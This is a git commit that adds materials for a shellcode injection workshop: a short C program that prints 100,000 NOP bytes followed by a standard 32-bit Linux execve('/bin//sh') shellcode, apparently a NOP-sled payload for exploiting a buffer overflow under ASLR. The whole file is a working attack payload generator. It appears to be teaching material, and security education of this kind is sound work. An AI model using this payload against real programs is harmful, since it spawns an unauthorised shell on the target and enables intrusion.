e405ca4cd9b45acbb3e65aaee89440e55171f9ce
Vladimir Kutuev <vladimir.kutuev@gmail.com>
2023-10-24 05:53:56 +0300

    Add materials of workshop shellcode injection

---
+++ injection_code_aslr.c
@@ -0,0 +1,9 @@
+#include <stdio.h>
+
+int main() {
+        for (int i = 0; i < 100000; ++i) {
+                printf("\x90");
+        }
+        printf("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80");
+        return 0;
+}
